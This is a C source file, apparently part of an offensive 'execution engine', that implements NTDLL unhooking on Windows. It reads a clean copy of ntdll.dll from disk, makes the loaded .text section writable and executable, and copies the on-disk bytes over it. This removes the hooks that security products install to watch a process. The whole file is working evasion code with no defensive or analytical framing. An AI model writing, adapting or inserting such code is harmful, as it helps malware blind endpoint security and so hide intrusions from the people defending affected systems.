/*
 * ntdll_unhook.c — NTDLL .text Section Restoration (Enhancement 4)
 * execution_engine/ntdll_unhook/ntdll_unhook.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Steps:
 *   1. GetSystemDirectoryW → build ntdll.dll path
 *   2. CreateFileW + CreateFileMappingW + MapViewOfFile (read-only)
 *   3. find_text_section() on disk image
 *   4. find_text_section() on loaded image
 *   5. VirtualProtect loaded .text → PAGE_EXECUTE_READWRITE
 *   6. memcpy(live_dst, disk_src, min(raw_size, virtual_size))
 *   7. VirtualProtect back to original protection
 *   8. Unmap + close handles
 *
 * The copy targets SizeOfRawData bytes — the on-disk extent of .text.
 * If VirtualSize is smaller (padding stripped by loader), we copy the
 * min to avoid stepping into the next section.
 */

#include "ntdll_unhook.h"
#include <stdio.h>
#include <string.h>

static IMAGE_SECTION_HEADER *find_text_section(BYTE *base)
{
    /* *the .text section: where all the promises are stored* */
    IMAGE_DOS_HEADER     *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS     *nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        /* Name field is 8 bytes, not guaranteed NUL-terminated */
        if (memcmp(sec->Name, ".text\0\0\0", 8) == 0 ||
            memcmp(sec->Name, ".text",    5) == 0)
            return sec;
    }
    return NULL;
}

BOOL unhook_ntdll(void)
{
    BYTE   *live     = (BYTE *)GetModuleHandleA("ntdll.dll");
    HANDLE  hFile    = INVALID_HANDLE_VALUE;
    HANDLE  hMap     = NULL;
    BYTE   *dview    = NULL;
    BOOL    result   = FALSE;

    if (!live) { printf("[unhook] loaded ntdll not found\n"); goto done; }

    /* ── 1. Locate ntdll.dll on disk ── */
    WCHAR path[MAX_PATH] = {0};
    if (!GetSystemDirectoryW(path, MAX_PATH)) {
        printf("[unhook] GetSystemDirectoryW failed error=%lu\n", GetLastError());
        goto done;
    }
    lstrcatW(path, L"\\ntdll.dll");

    hFile = CreateFileW(path, GENERIC_READ,
                        FILE_SHARE_READ | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[unhook] CreateFileW(%ls) failed error=%lu\n", path, GetLastError());
        goto done;
    }

    /* ── 2. Map read-only ── */
    hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) {
        printf("[unhook] CreateFileMappingW failed error=%lu\n", GetLastError());
        goto done;
    }
    dview = (BYTE *)MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!dview) {
        printf("[unhook] MapViewOfFile failed error=%lu\n", GetLastError());
        goto done;
    }

    /* ── 3. Find .text in disk image (raw file offsets) ── */
    IMAGE_SECTION_HEADER *disk_sec = find_text_section(dview);
    if (!disk_sec) { printf("[unhook] disk .text not found\n"); goto done; }

    /* ── 4. Find .text in live image (VAs) ── */
    IMAGE_SECTION_HEADER *live_sec = find_text_section(live);
    if (!live_sec) { printf("[unhook] live .text not found\n"); goto done; }

    /* Bytes to restore: on-disk raw data, capped to live virtual size */
    DWORD copy_sz = disk_sec->SizeOfRawData;
    if (live_sec->Misc.VirtualSize && live_sec->Misc.VirtualSize < copy_sz)
        copy_sz = live_sec->Misc.VirtualSize;

    BYTE *disk_src = dview + disk_sec->PointerToRawData;
    BYTE *live_dst = live  + live_sec->VirtualAddress;

    printf("[unhook] .text  live_dst=%p  disk_src=%p  bytes=0x%lX\n",
           (void*)live_dst, (void*)disk_src, copy_sz);

    /* ── 5. Make live .text writable ── */
    DWORD old_prot = 0;
    if (!VirtualProtect(live_dst, copy_sz, PAGE_EXECUTE_READWRITE, &old_prot)) {
        printf("[unhook] VirtualProtect(RWX) failed error=%lu\n", GetLastError());
        goto done;
    }

    /* ── 6. Overwrite with clean bytes ── */
    memcpy(live_dst, disk_src, copy_sz);

    /* ── 7. Restore original protection ── */
    DWORD tmp = 0;
    VirtualProtect(live_dst, copy_sz, old_prot, &tmp);

    printf("[unhook] ntdll .text restored (0x%lX bytes, original prot=0x%lX)\n",
           copy_sz, old_prot);
    result = TRUE;

done:
    if (dview) UnmapViewOfFile(dview);
    if (hMap)  CloseHandle(hMap);
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return result;
}